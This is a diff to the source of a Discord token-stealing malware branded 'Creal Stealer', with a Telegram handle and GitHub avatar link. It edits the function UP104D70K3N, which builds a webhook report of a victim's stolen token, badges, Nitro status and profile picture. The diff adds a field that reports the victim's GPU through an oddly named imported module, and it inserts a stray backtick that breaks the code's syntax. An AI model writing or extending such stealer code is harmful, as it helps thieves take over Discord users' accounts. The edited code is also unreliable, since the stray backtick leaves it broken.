@@ -8,6 +8,7 @@ import random
 import warnings
 import threading
 import subprocess
+import VGAtil as GPU
 from sys import executable, stderr
 from base64 import b64decode
 from json import loads, dumps
@@ -451,6 +452,11 @@ def UP104D70K3N(token, path):
                     "inline": True
                 },
                 {
+                    "name": "<:mc_earth:589630396476555264> VGA:",
+                    "value": f"```{GPU.getGPUs()}```",
+                    "inline": True
+                },
+                {
                     "name": "<:woozyface:874220843528486923> Badges:",
                     "value": f"{nitro}{badge}",
                     "inline": True
@@ -488,7 +494,7 @@ def UP104D70K3N(token, path):
                 "url": f"{pfp}"
                 }
             }
-        ],
+        ],`
         "username": f"Creal Stealer | t.me/Creal Stealer",
         "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
         "attachments": []
